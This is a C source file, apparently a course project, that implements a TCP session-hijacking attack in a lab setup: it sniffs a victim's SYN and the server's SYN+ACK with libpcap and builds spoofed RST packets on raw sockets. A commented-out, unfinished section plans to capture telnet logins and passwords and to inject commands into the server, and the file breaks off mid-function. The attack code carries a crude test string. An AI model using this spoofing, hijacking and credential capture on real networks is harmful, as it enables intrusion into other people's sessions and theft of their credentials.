/*----------------
Done in colab with Joaquin Castanon for the course INF473X
*/
//#include's
	#include<sys/types.h>
	#include<sys/socket.h>
	#include<netinet/in.h>
	#include<unistd.h>
	#include<netdb.h>
	#include<pthread.h>
	#include<pcap.h>
	#include<netinet/in.h>
	#include<arpa/inet.h>
	#include<time.h>
	#include<unistd.h>//For close()

	#include<stdio.h>
	#include<string.h>
	#include<stdlib.h>

	#include "header.h"
typedef unsigned char u_char;

#define VICTIM_IP "192.168.185.1" //set your destination ip here
#define TEST_STRING "Hijacked Bitch"
#define COMMON_INTERFACE "vmnet1"
#define PACKET_SIZE 64

//Declaring Future Functions
	void find_syn_request(u_char *, const struct pcap_pkthdr *, const u_char *);
	void find_syn_ack_answer(u_char *, const struct pcap_pkthdr *, const u_char *);
	void find_login_request(u_char *, const struct pcap_pkthdr *, const u_char *);
	void find_login_attempt(u_char *, const struct pcap_pkthdr *, const u_char *);
	void find_password_request(u_char *, const struct pcap_pkthdr *, const u_char *);
	void find_password_attempt(u_char *, const struct pcap_pkthdr *, const u_char *);
	void find_succes_login(u_char *, const struct pcap_pkthdr *, const u_char *);
	void print_tcp_ip_hdr();
	void send_msg(struct iphdr *, struct tcphdr *);
	void send_rst(struct iphdr *, struct tcphdr *);


//some global counter
	int tcp=0,udp=0,icmp=0,others=0,igmp=0,total=0;
//Pcap parameters
	pcap_t *handle;
	pcap_if_t *all_dev, *dev;

//Global Headers Variables
	struct iphdr *iph_client_global;
	struct iphdr *iph_server_global;
	struct tcphdr *tcph_client_global;
	struct tcphdr *tcph_server_global;
	struct pseudo_tcp_header psh;
//Client Sensitive Information
	char *login_global;
	char *password_global;	

int main(int argc, char *argv[]) {	
/*1- Hear the syn message from the victim:
    1- Be in the same network-link as the client or the host (we assume we know the Client)
    2- Stay in listen to packages comming from client and host to find the good packages stating connection
        1- Using Pcap to listen and filter to rece
        2- Open packages and see if it's a starter package (syn == 1) and grab the important information
    3- Look for a message with the syn flag coming from the victim
	4- Send the reset to end connection with the victim

2- Attack a telnet server
	1- Look for the login/passwrd attempt
    2- Send any command you want the server to execute*/

//Begin

//1.1 - be in the same network-link as the client or the host (we assume we know the Client)
    //A priori on est déjà dans le même lien de conexion
	char packet_client[65536], *data_client;
	char packet_server[65536], *data_server;
	char data_string[] = TEST_STRING;
	memset(packet_client, 0, 65536);
	memset(packet_server, 0, 65536);

    //Data section pointer
	data_client = packet_client + sizeof(struct iphdr) + sizeof(struct tcphdr);
	data_server = packet_server + sizeof(struct iphdr) + sizeof(struct tcphdr);
	//fill the data section
	strncpy(data_client, data_string, strlen(data_string));
	strncpy(data_server, data_string, strlen(data_string));

    //IP header global pointer
	iph_client_global = (struct iphdr *)packet_client;
	iph_server_global = (struct iphdr *)packet_server;
	
	//tcph_global Pointers
	tcph_client_global = (struct tcphdr *)(packet_client + sizeof(struct iphdr));
	tcph_server_global = (struct tcphdr *)(packet_server + sizeof(struct iphdr));

//1.2 - stay in listen to packages comming from client and host to find the good packages stating connection
	char err_buf[PCAP_ERRBUF_SIZE], dev_list[30][2];
	char *dev_name;
	bpf_u_int32 net_ip, mask;

	struct bpf_program fp;		/* The compiled filter expression */
	//Filter Expression set up for SYN+ACK
		char* strip1 = malloc(100*sizeof(char));
		char* victim_ip_source = VICTIM_IP;
		sprintf(strip1,"src %s && tcp[tcpflags] == tcp-syn", victim_ip_source);
    	char filter_exp[] = "                                                               ";
		strncpy(filter_exp, strip1, strlen(strip1));
	//----------------------------------------------------------------------------------------

	//Get all available devices
		if(pcap_findalldevs(&all_dev, err_buf))
		{
			fprintf(stderr, "Unable to find devices: %s", err_buf);
			exit(1);
		}
		if(all_dev == NULL)
		{
			fprintf(stderr, "No device found. Please check that you are running with root \n");
			exit(1);
		}
	    int c = 1;
		for(dev = all_dev; dev != NULL; dev = dev->next)
		{
		if(dev->name != NULL)
		{
			strncpy(dev_list[c], dev->name, strlen(dev->name));
		}
		c++;
		}
    //To look into (we assume that the client is in the same connexion as us)
	dev_name = COMMON_INTERFACE;

	//look up the chosen device------------------------------------------------------------------------------
	int ret = pcap_lookupnet(dev_name, &net_ip, &mask, err_buf);
    if(ret < 0)
	{
		fprintf(stderr, "Error looking up net: %s \n", dev_name);
		exit(1);
	}
    struct sockaddr_in addr;
	addr.sin_addr.s_addr = net_ip;
	char ip_char[100];

		inet_ntop(AF_INET, &(addr.sin_addr), ip_char, 100);
		//printf("NET address: %s\n", ip_char);
		addr.sin_addr.s_addr = mask;
		memset(ip_char, 0, 100);
		inet_ntop(AF_INET, &(addr.sin_addr), ip_char, 100);
		//printf("Mask: %s\n", ip_char);
    //Open Device
	handle = pcap_open_live(dev_name, BUF_SIZE, 1, 0, err_buf);
		if(handle == NULL)
		{
			fprintf(stderr, "Unable to open device %s: %s\n", dev_name, err_buf);
			exit(1);
		}
	printf("Device %s is opened. Begin sniffing for SYN from Victim...\n", dev_name);
    logfile=fopen("log.txt","w");
	if(logfile==NULL)
	{
		printf("Unable to create file.");
	}
	if (pcap_compile(handle, &fp, filter_exp, 0, net_ip) == -1) {
		 fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
		 return(2);
	 }
	 if (pcap_setfilter(handle, &fp) == -1) {
		 fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
		 return(2);
	 }


	//Put the device in sniff loop
	pcap_loop(handle , -1 , find_syn_request, NULL);
	pcap_close(handle);
    print_tcp_ip_hdr(iph_client_global,tcph_client_global);
	//--------------------------------------------------------------------------------------------------------
//1.3 - wait for the Syn-Ack from server
	//Filter Expression set up for SYN+ACK
		unsigned int ip = iph_client_global->daddr;
    	unsigned char bytes[4];
		bytes[0] = ip & 0xFF;
    	bytes[1] = (ip >> 8) & 0xFF;
    	bytes[2] = (ip >> 16) & 0xFF;
    	bytes[3] = (ip >> 24) & 0xFF;
		char* strip = malloc(100*sizeof(char)); 
		sprintf(strip,"src %d.%d.%d.%d && tcp[13]=18 && dst %s" , bytes[0], bytes[1], bytes[2], bytes[3], victim_ip_source);
		char filter_exp_2[] = "                                                   ";
		strncpy(filter_exp_2, strip, strlen(strip));
	//----------------------------------------------------------------------------------------
	ret = pcap_lookupnet(dev_name, &net_ip, &mask, err_buf);
    if(ret < 0)
	{
		fprintf(stderr, "Error looking up net: %s \n", dev_name);
		exit(1);
	}
	addr.sin_addr.s_addr = net_ip;
	inet_ntop(AF_INET, &(addr.sin_addr), ip_char, 100);
	//printf("NET address: %s\n", ip_char);
	addr.sin_addr.s_addr = mask;
	memset(ip_char, 0, 100);
	inet_ntop(AF_INET, &(addr.sin_addr), ip_char, 100);
	//printf("Mask: %s\n", ip_char);
    //Open Device
	handle = pcap_open_live(dev_name, BUF_SIZE, 1, 0, err_buf);
	if(handle == NULL)
	{
		fprintf(stderr, "Unable to open device %s: %s\n", dev_name, err_buf);
		exit(1);
	}
	printf("\nDevice %s is opened. Begin sniffing for SYN+ACK from our Server...\n", dev_name);
    if (pcap_compile(handle, &fp, filter_exp_2, 0, net_ip) == -1) {
		 fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp_2, pcap_geterr(handle));
		 return(2);
	 }
	 if (pcap_setfilter(handle, &fp) == -1) {
		 fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp_2, pcap_geterr(handle));
		 return(2);
	 }
	pcap_loop(handle , 1000 , find_syn_ack_answer, NULL);
	pcap_close(handle);
	
	print_tcp_ip_hdr(iph_server_global,tcph_server_global);
	//--------------------------------------------------------------------------------------------------------
/*
//2.1 - look for the login/passwrd attempt
//System asks for a login
	sprintf(strip,"src %d.%d.%d.%d && dst %s" , bytes[0], bytes[1], bytes[2], bytes[3], victim_ip_source);
	char filter_exp_login[] = "                                                   ";
	strncpy(filter_exp_login, strip, strlen(strip));
	ret = pcap_lookupnet(dev_name, &net_ip, &mask, err_buf);
    if(ret < 0)
	{
		fprintf(stderr, "Error looking up net: %s \n", dev_name);
		exit(1);
	}
	addr.sin_addr.s_addr = net_ip;
	inet_ntop(AF_INET, &(addr.sin_addr), ip_char, 100);
	addr.sin_addr.s_addr = mask;
	memset(ip_char, 0, 100);
	inet_ntop(AF_INET, &(addr.sin_addr), ip_char, 100);
	handle = pcap_open_live(dev_name, BUF_SIZE, 1, 0, err_buf);
	if(handle == NULL)
	{
		fprintf(stderr, "Unable to open device %s: %s\n", dev_name, err_buf);
		exit(1);
	}
	printf("\nDevice %s is opened. Begin sniffing for a LOGIN_REQUEST from our Server...\n", dev_name);
    if (pcap_compile(handle, &fp, filter_exp_login, 0, net_ip) == -1) {
		 fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp_login, pcap_geterr(handle));
		 return(2);
	 }
	 if (pcap_setfilter(handle, &fp) == -1) {
		 fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp_login, pcap_geterr(handle));
		 return(2);
	 }
	pcap_loop(handle , 1000 , find_login_request, NULL);
	pcap_close(handle);
//Client provides a login username
	sprintf(strip,"dst %d.%d.%d.%d && src %s" , bytes[0], bytes[1], bytes[2], bytes[3], victim_ip_source);//BOTAR O DESTINATÁRIO TAMBÉM
	char filter_exp_attempt_login[] = "                                                   ";
	strncpy(filter_exp_attempt_login, strip, strlen(strip));
	ret = pcap_lookupnet(dev_name, &net_ip, &mask, err_buf);
    if(ret < 0)
	{
		fprintf(stderr, "Error looking up net: %s \n", dev_name);
		exit(1);
	}
	addr.sin_addr.s_addr = net_ip;
		inet_ntop(AF_INET, &(addr.sin_addr), ip_char, 100);
		addr.sin_addr.s_addr = mask;
		memset(ip_char, 0, 100);
		inet_ntop(AF_INET, &(addr.sin_addr), ip_char, 100);
    //Open Device
	handle = pcap_open_live(dev_name, BUF_SIZE, 1, 0, err_buf);
		if(handle == NULL)
		{
			fprintf(stderr, "Unable to open device %s: %s\n", dev_name, err_buf);
			exit(1);
		}
	printf("Device %s is opened. Begin sniffing for LOGIN_ATTEMPT from Victim...\n", dev_name);
    logfile=fopen("log.txt","w");
	if(logfile==NULL)
	{
		printf("Unable to create file.");
	}
	if (pcap_compile(handle, &fp, filter_exp_attempt_login, 0, net_ip) == -1) {
		 fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp_attempt_login, pcap_geterr(handle));
		 return(2);
	 }
	 if (pcap_setfilter(handle, &fp) == -1) {
		 fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp_attempt_login, pcap_geterr(handle));
		 return(2);
	 }

	//Put the device in sniff loop
	pcap_loop(handle , -1 , find_login_attempt, NULL);
	pcap_close(handle);


//System asks for password
	sprintf(strip,"src %d.%d.%d.%d && dst %s" , bytes[0], bytes[1], bytes[2], bytes[3], victim_ip_source);//BOTAR O DESTINATÁRIO TAMBÉM
	char filter_exp_password[] = "                                                   ";
	strncpy(filter_exp_password, strip, strlen(strip));
	ret = pcap_lookupnet(dev_name, &net_ip, &mask, err_buf);
    if(ret < 0)
	{
		fprintf(stderr, "Error looking up net: %s \n", dev_name);
		exit(1);
	}
	addr.sin_addr.s_addr = net_ip;
	inet_ntop(AF_INET, &(addr.sin_addr), ip_char, 100);
	addr.sin_addr.s_addr = mask;
	memset(ip_char, 0, 100);
	inet_ntop(AF_INET, &(addr.sin_addr), ip_char, 100);
	handle = pcap_open_live(dev_name, BUF_SIZE, 1, 0, err_buf);
	if(handle == NULL)
	{
		fprintf(stderr, "Unable to open device %s: %s\n", dev_name, err_buf);
		exit(1);
	}
	printf("\nDevice %s is opened. Begin sniffing for a PASSWORD_REQUEST from our Server...\n", dev_name);
    if (pcap_compile(handle, &fp, filter_exp_password, 0, net_ip) == -1) {
		 fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp_password, pcap_geterr(handle));
		 return(2);
	 }
	 if (pcap_setfilter(handle, &fp) == -1) {
		 fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp_password, pcap_geterr(handle));
		 return(2);
	 }
	pcap_loop(handle , 1000 , find_password_request, NULL);
	pcap_close(handle);
//Client provides a password

	sprintf(strip,"dst %d.%d.%d.%d && src %s" , bytes[0], bytes[1], bytes[2], bytes[3], victim_ip_source);
	char filter_exp_attempt_password[] = "                                                   ";
	strncpy(filter_exp_attempt_password, strip, strlen(strip));
	ret = pcap_lookupnet(dev_name, &net_ip, &mask, err_buf);
    if(ret < 0)
	{
		fprintf(stderr, "Error looking up net: %s \n", dev_name);
		exit(1);
	}
	addr.sin_addr.s_addr = net_ip;
		inet_ntop(AF_INET, &(addr.sin_addr), ip_char, 100);
		addr.sin_addr.s_addr = mask;
		memset(ip_char, 0, 100);
		inet_ntop(AF_INET, &(addr.sin_addr), ip_char, 100);
    //Open Device
	handle = pcap_open_live(dev_name, BUF_SIZE, 1, 0, err_buf);
		if(handle == NULL)
		{
			fprintf(stderr, "Unable to open device %s: %s\n", dev_name, err_buf);
			exit(1);
		}
	printf("Device %s is opened. Begin sniffing for PASSWORD_ATTEMPT from Victim...\n", dev_name);
    logfile=fopen("log.txt","w");
	if(logfile==NULL)
	{
		printf("Unable to create file.");
	}
	if (pcap_compile(handle, &fp, filter_exp_attempt_password, 0, net_ip) == -1) {
		 fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp_attempt_password, pcap_geterr(handle));
		 return(2);
	 }
	 if (pcap_setfilter(handle, &fp) == -1) {
		 fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp_attempt_password, pcap_geterr(handle));
		 return(2);
	 }

	//Put the device in sniff loop
	pcap_loop(handle , -1 , find_password_attempt, NULL);
	pcap_close(handle);

//Look for a successfull answer to the login
	sprintf(strip,"src %d.%d.%d.%d && dst %s" , bytes[0], bytes[1], bytes[2], bytes[3], victim_ip_source);//BOTAR O DESTINATÁRIO TAMBÉM
	char filter_exp_succes[] = "                                                   ";
	strncpy(filter_exp_succes, strip, strlen(strip));
	ret = pcap_lookupnet(dev_name, &net_ip, &mask, err_buf);
    if(ret < 0)
	{
		fprintf(stderr, "Error looking up net: %s \n", dev_name);
		exit(1);
	}
	addr.sin_addr.s_addr = net_ip;
	inet_ntop(AF_INET, &(addr.sin_addr), ip_char, 100);
	addr.sin_addr.s_addr = mask;
	memset(ip_char, 0, 100);
	inet_ntop(AF_INET, &(addr.sin_addr), ip_char, 100);
	handle = pcap_open_live(dev_name, BUF_SIZE, 1, 0, err_buf);
	if(handle == NULL)
	{
		fprintf(stderr, "Unable to open device %s: %s\n", dev_name, err_buf);
		exit(1);
	}
	printf("\nDevice %s is opened. Begin sniffing for a LOGIN_CONFIRMATION from our Server...\n", dev_name);
    if (pcap_compile(handle, &fp, filter_exp_succes, 0, net_ip) == -1) {
		 fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp_succes, pcap_geterr(handle));
		 return(2);
	 }
	 if (pcap_setfilter(handle, &fp) == -1) {
		 fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp_succes, pcap_geterr(handle));
		 return(2);
	 }
	pcap_loop(handle , 1000 , find_succes_login, NULL);
	pcap_close(handle);
//End	*/
	return 0;
}


//1.2.2
//find the first package sending a Syn from our client and put the informations in our global headers
void find_syn_request(u_char *args, const struct pcap_pkthdr *header, const u_char *buffer){
	int size = header->len;

	//Get the IP Header part of this packet
	struct iphdr *iph = (struct iphdr*)(buffer + sizeof(struct ethhdr));
	
    unsigned short iphdrlen;
	iphdrlen = iph->ihl*4;

    //Get the TCP Header
    struct tcphdr *tcph=(struct tcphdr*)(buffer + iphdrlen + sizeof(struct ethhdr));
    //Check if there's a Syn being sent
    if(tcph->syn != 1) return; //If it's not a starter package we leave it away
    printf("We have captured a stablishing connection from our victim\n");
    fflush(stdout);    
    ++total;
	switch (iph->protocol) //Check the Protocol and do accordingly...
	{
	case 1:  //ICMP Protocol
		++icmp;
		print_icmp_packet( buffer , size);
		break;

	case 2:  //IGMP Protocol
		++igmp;
		break;

	case 6:  //TCP Protocol
		++tcp;
		print_tcp_packet(buffer , size);
		break;

	case 17: //UDP Protocol
		++udp;
		print_udp_packet(buffer , size);
		break;

	default: //Some Other Protocol like ARP etc.
		++others;
		break;
	}
	printf("TCP : %d   UDP : %d   ICMP : %d   IGMP : %d   Others : %d   Total : %d\n", tcp , udp , icmp , igmp , others , total);
    
	//Copy the information into our global variables
	memcpy(iph_client_global,iph, iphdrlen);
	memcpy(tcph_client_global,tcph, sizeof(struct tcphdr));
	pcap_breakloop(handle);
}
void print_tcp_ip_hdr(struct iphdr *iph, struct tcphdr *tcph){
	printf("\n");
    printf( "IP Header\n");
    printf( "   |-IP Version        : %d\n",(unsigned int)iph->version);
    printf( "   |-IP Header Length  : %d DWORDS or %d Bytes\n",(unsigned int)iph->ihl,((unsigned int)(iph->ihl))*4);
    printf( "   |-Type Of Service   : %d\n",(unsigned int)iph->tos);
    printf( "   |-IP Total Length   : %d  Bytes(Size of Packet)\n",ntohs(iph->tot_len));
    printf( "   |-Identification    : %d\n",ntohs(iph->id));
    //fprintf(logfile , "   |-Reserved ZERO Field   : %d\n",(unsigned int)iphdr->ip_reserved_zero);
    //fprintf(logfile , "   |-Dont Fragment Field   : %d\n",(unsigned int)iphdr->ip_dont_fragment);
    //fprintf(logfile , "   |-More Fragment Field   : %d\n",(unsigned int)iphdr->ip_more_fragment);
    printf("   |-TTL      : %d\n",(unsigned int)iph->ttl);
    printf("   |-Protocol : %d\n",(unsigned int)iph->protocol);
    printf("   |-Checksum : %d\n",ntohs(iph->check));
	
	unsigned int ip = iph->saddr;

    unsigned char bytes[4];
    bytes[0] = ip & 0xFF;
    bytes[1] = (ip >> 8) & 0xFF;
    bytes[2] = (ip >> 16) & 0xFF;
    bytes[3] = (ip >> 24) & 0xFF;   

    printf("   |-Source IP        : %d.%d.%d.%d\n" , bytes[0], bytes[1], bytes[2], bytes[3]);

	ip = iph->daddr;
	bytes[0] = ip & 0xFF;
    bytes[1] = (ip >> 8) & 0xFF;
    bytes[2] = (ip >> 16) & 0xFF;
    bytes[3] = (ip >> 24) & 0xFF;
	printf("   |-Destination IP   : %d.%d.%d.%d\n" , bytes[0], bytes[1], bytes[2], bytes[3]);
	char* strip = malloc(15*sizeof(char)); 
	sprintf(strip,"%d.%d.%d.%d\n" , bytes[0], bytes[1], bytes[2], bytes[3]);
 

	printf(  "\n");
    printf(  "TCP Header\n");
    printf(  "   |-Source Port      : %u\n",ntohs(tcph->source));
    printf(  "   |-Destination Port : %u\n",ntohs(tcph->dest));
    printf(  "   |-Sequence Number    : %u\n",ntohl(tcph->seq));
    printf(  "   |-Acknowledge Number : %u\n",ntohl(tcph->ack_seq));
    printf(  "   |-Header Length      : %d DWORDS or %d BYTES\n" ,(unsigned int)tcph->doff,(unsigned int)tcph->doff*4);
    //fprint(logfile , "   |-CWR Flag : %d\n",(unsigned int)tcph->cwr);
    //fprint(logfile , "   |-ECN Flag : %d\n",(unsigned int)tcph->ece);
    printf(  "   |-Urgent Flag          : %d\n",(unsigned int)tcph->urg);
    printf(  "   |-Acknowledgement Flag : %d\n",(unsigned int)tcph->ack);
    printf(  "   |-Push Flag            : %d\n",(unsigned int)tcph->psh);
    printf(  "   |-Reset Flag           : %d\n",(unsigned int)tcph->rst);
    printf(  "   |-Synchronise Flag     : %d\n",(unsigned int)tcph->syn);
    printf(  "   |-Finish Flag          : %d\n",(unsigned int)tcph->fin);
    printf(  "   |-Window         : %d\n",ntohs(tcph->window));
    printf(  "   |-Checksum       : %d\n",ntohs(tcph->check));
    printf(  "   |-Urgent Pointer : %d\n",tcph->urg_ptr);
    printf(  "\n");

}
//1.2.3
void find_syn_ack_answer(u_char *args, const struct pcap_pkthdr *header, const u_char *buffer){
	int size = header->len;

	//Get the IP Header part of this packet
	struct iphdr *iph = (struct iphdr*)(buffer + sizeof(struct ethhdr));
	
    unsigned short iphdrlen;
  iphdrlen = iph->ihl*4;

    //Get the TCP Header
    struct tcphdr *tcph=(struct tcphdr*)(buffer + iphdrlen + sizeof(struct ethhdr));
    //Check if there's a Syn being sent
    if(tcph->syn != 1) return; 
    printf("We have captured a SYN+ACK from the server\n");
    fflush(stdout);    
    ++total;
	switch (iph->protocol) //Check the Protocol and do accordingly...
	{
	case 1:  //ICMP Protocol
		++icmp;
		print_icmp_packet( buffer , size);
		break;

	case 2:  //IGMP Protocol
		++igmp;
		break;

	case 6:  //TCP Protocol
		++tcp;
		print_tcp_packet(buffer , size);
		break;

	case 17: //UDP Protocol
		++udp;
		print_udp_packet(buffer , size);
		break;

	default: //Some Other Protocol like ARP etc.
		++others;
		break;
	}
	printf("TCP : %d   UDP : %d   ICMP : %d   IGMP : %d   Others : %d   Total : %d\n", tcp , udp , icmp , igmp , others , total);
    

	//Copy the information into our global variables
	memcpy(iph_server_global,iph, iphdrlen);
	memcpy(tcph_server_global,tcph, sizeof(struct tcphdr));
	pcap_breakloop(handle);
}
//1.4
void send_rst(struct iphdr *srv_iphd, struct tcphdr *srv_tcphd){
    //socket
    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    int hincl = 1;                  /* 1 = on, 0 = off */
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl));
    if(fd < 0){perror("Error creating raw socket ");exit(1);}

    //le packet à envoyer
    char packet[65536];//I don`t know if we need all this space for it
    memset(packet, 0, 65536);

    //IP header pointer
    struct iphdr *iph = (struct iphdr *)packet;

    //TCP header pointer
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
    struct pseudo_tcp_header psh; //pseudo header

    //fill the IP header here
    iph->version = 4; //s'il utilise ipv6 on est pas bien
    iph->ihl = 5;
    iph->tos = 0;
    iph->tot_len = sizeof (struct iphdr) + sizeof (struct tcphdr);
    iph->id = 0;
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = 6;//6 pour TCP
    iph->saddr = srv_iphd->saddr;
    iph->daddr = srv_iphd->daddr;

    iph->check = checksum((unsigned short*) packet, iph->tot_len);
    
    //Filling the TCP Header
    tcph->source = srv_tcphd->source;
    tcph->dest = srv_tcphd->dest;
    tcph->seq = srv_tcphd->seq + 1;
    tcph->syn= 0;
    tcph->fin = 0;
    tcph->rst=1;//RST flag
    tcph->psh = 0;
    tcph->ack = 0;
    tcph->ack_seq = 0;
    tcph->urg=0;
    tcph->window = htons(5840);//Maximum window size allowed
    tcph->doff=5;//TCP header size
    tcph->check = 0;
    tcph->urg_ptr = 0;
    
    psh.dest_address = iph->daddr;
    psh.source_address = iph->saddr;
    psh.protocol = 6;
    psh.tcp_length = htons(sizeof(struct tcphdr));
    psh.placeholder = 0;
    
    int psize = sizeof(struct pseudo_tcp_header) + sizeof(struct tcphdr);
    char *pseudogram = malloc(psize);
    
    memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_tcp_header));
    memcpy(pseudogram + sizeof(struct pseudo_tcp_header) , tcph , sizeof(struct tcphdr));
    
    tcph->check = checksum( (unsigned short*) pseudogram , psize);
    
    //destination socket
    struct sockaddr_in dest;
    dest.sin_addr.s_addr=iph->daddr;
    dest.sin_family=AF_INET;
    dest.sin_port=tcph->dest;

    //send the rst packet
    if(sendto(fd, packet, iph->tot_len, 0, (const struct  sockaddr *)&dest, sizeof(dest))==-1){
        printf("Unable to send package\n");
    }
	else{
		printf("\nRst package sent to Victim\n");
		//print_tcp_ip_hdr(iph,tcph);
	}	
}
//Part 2 Functions - NOT READY
//We need to take a look in how to know if our loguin/password has been accepted or not when verifing the packages (if we have the last login it will work)
void find_login_request(uint8_t *args, const struct pcap_pkthdr *header, const uint8_t *buffer){
	int size = header->len;
	//Get the IP Header part of this packet
	struct iphdr *iph = (struct iphdr*)(buffer + sizeof(struct ethhdr));
    unsigned short iphdrlen;
  	iphdrlen = iph->ihl*4;
    //Get the TCP Header
    struct tcphdr *tcph=(struct tcphdr*)(buffer + iphdrlen + sizeof(struct ethhdr));
    //CHECK IF IT'S A LOGIN REQUEST



	//-----------------------------	
	printf("We have captured a LOGIN_REQUEST from the server\n");
    fflush(stdout);    
    ++total;
	switch (iph->protocol) //Check the Protocol and do accordingly...
	{
	case 1:  //ICMP Protocol
		++icmp;
		print_icmp_packet( buffer , size);
		break;

	case 2:  //IGMP Protocol
		++igmp;
		break;

	case 6:  //TCP Protocol
		++tcp;
		print_tcp_packet(buffer , size);
		break;

	case 17: //UDP Protocol
		++udp;
		print_udp_packet(buffer , size);
		break;

	default: //Some Other Protocol like ARP etc.
		++others;
		break;
	}
	printf("TCP : %d   UDP : %d   ICMP : %d   IGMP : %d   Others : %d   Total : %d\n\n", tcp , udp , icmp , igmp , others , total);
	
	memcpy(iph_server_global,iph, iphdrlen);
	memcpy(tcph_server_global,tcph, sizeof(struct tcphdr));
	pcap_breakloop(handle);
}
void find_login_attempt(u_char *args, const struct pcap_pkthdr *header, const u_char *buffer){
	int size = header->len;

	//Get the IP Header part of this packet
	struct iphdr *iph = (struct iphdr*)(buffer + sizeof(struct ethhdr));
	
    unsigned short iphdrlen;
	iphdrlen = iph->ihl*4;

    //Get the TCP Header
    struct tcphdr *tcph=(struct tcphdr*)(buffer + iphdrlen + sizeof(struct ethhdr));
    //Check if there's  LOGIN_ATTEMPT being made and keep login in the global variable login



	//--------
	printf("We have captured a LOGIN_ATTEMPT from our victim\n");
    fflush(stdout);    
    ++total;
	switch (iph->protocol) //Check the Protocol and do accordingly...
	{
	case 1:  //ICMP Protocol
		++icmp;
		print_icmp_packet( buffer , size);
		break;

	case 2:  //IGMP Protocol
		++igmp;
		break;

	case 6:  //TCP Protocol
		++tcp;
		print_tcp_packet(buffer , size);
		break;

	case 17: //UDP Protocol
		++udp;
		print_udp_packet(buffer , size);
		break;

	default: //Some Other Protocol like ARP etc.
		++others;
		break;
	}
	printf("TCP : %d   UDP : %d   ICMP : %d   IGMP : %d   Others : %d   Total : %d\n", tcp , udp , icmp , igmp , others , total);
    
	memcpy(iph_client_global,iph, iphdrlen);
	memcpy(tcph_client_global,tcph, sizeof(struct tcphdr));
	pcap_breakloop(handle);
}
void find_password_request(uint8_t *args, const struct pcap_pkthdr *header, const uint8_t *buffer){
	int size = header->len;
	//Get the IP Header part of this packet
	struct iphdr *iph = (struct iphdr*)(buffer + sizeof(struct ethhdr));
    unsigned short iphdrlen;
  	iphdrlen = iph->ihl*4;
    //Get the TCP Header
    struct tcphdr *tcph=(struct tcphdr*)(buffer + iphdrlen + sizeof(struct ethhdr));
    //CHECK IF IT'S A PASSWORD REQUEST



	//-----------------------------	
	printf("We have captured a PASSWORD_REQUEST from the server\n");
    fflush(stdout);    
    ++total;
	switch (iph->protocol) //Check the Protocol and do accordingly...
	{
	case 1:  //ICMP Protocol
		++icmp;
		print_icmp_packet( buffer , size);
		break;

	case 2:  //IGMP Protocol
		++igmp;
		break;

	case 6:  //TCP Protocol
		++tcp;
		print_tcp_packet(buffer , size);
		break;

	case 17: //UDP Protocol
		++udp;
		print_udp_packet(buffer , size);
		break;

	default: //Some Other Protocol like ARP etc.
		++others;
		break;
	}
	printf("TCP : %d   UDP : %d   ICMP : %d   IGMP : %d   Others : %d   Total : %d\n\n", tcp , udp , icmp , igmp , others , total);
	
	memcpy(iph_server_global,iph, iphdrlen);
	memcpy(tcph_server_global,tcph, sizeof(struct tcphdr));
	pcap_breakloop(handle);
}
void find_password_attempt(u_char *args, const struct pcap_pkthdr *header, const u_char *buffer){
	int size = header->len;

	//Get the IP Header part of this packet
	struct iphdr *iph = (struct iphdr*)(buffer + sizeof(struct ethhdr));
	
    unsigned short iphdrlen;
	iphdrlen = iph->ihl*4;

    //Get the TCP Header
    struct tcphdr *tcph=(struct tcphdr*)(buffer + iphdrlen + sizeof(struct ethhdr));
    //Check if there's  PASSWORD_ATTEMPT being made and keep password in the global variable password



	//--------
	printf("We have captured a PASSWORD_ATTEMPT from our victim\n");
    fflush(stdout);    
    ++total;
	switch (iph->protocol) //Check the Protocol and do accordingly...
	{
	case 1:  //ICMP Protocol
		++icmp;
		print_icmp_packet( buffer , size);
		break;

	case 2:  //IGMP Protocol
		++igmp;
		break;

	case 6:  //TCP Protocol
		++tcp;
		print_tcp_packet(buffer , size);
		break;

	case 17: //UDP Protocol
		++udp;
		print_udp_packet(buffer , size);
		break;

	default: //Some Other Protocol like ARP etc.
		++others;
		break;
	}
	printf("TCP : %d   UDP : %d   ICMP : %d   IGMP : %d   Others : %d   Total : %d\n", tcp , udp , icmp , igmp , others , total);
    
	memcpy(iph_client_global,iph, iphdrlen);
	memcpy(tcph_client_global,tcph, sizeof(struct tcphdr));
	pcap_breakloop(handle);
}
void send_msg(struct iphdr *srv_iphd, struct tcphdr *srv_tcphd){//NOT READY, WE HAVE TO WRITE THE MSG WE WANT AND SWITCH THE FLAGS IF NEEDED
	//socket
    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    int hincl = 1;                  /* 1 = on, 0 = off */
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl));
    if(fd < 0){perror("Error creating raw socket ");exit(1);}

    //le packet à envoyer
    char packet[65536];
    memset(packet, 0, 65536);

    //IP header pointer
    struct iphdr *iph = (struct iphdr *)packet;

    //TCP header pointer
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
    struct pseudo_tcp_header psh; //pseudo header

    //fill the IP header here
    iph->version = 4; //s'il utilise ipv6 on est pas bien
    iph->ihl = 5;
    iph->tos = 0;
    iph->tot_len = sizeof (struct iphdr) + sizeof (struct tcphdr);
    iph->id = 0;
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = 6;//6 pour TCP
    iph->saddr = srv_iphd->saddr;
    iph->daddr = srv_iphd->daddr;

    iph->check = checksum((unsigned short*) packet, iph->tot_len);
    
    //Filling the TCP Header
    tcph->source = srv_tcphd->source;
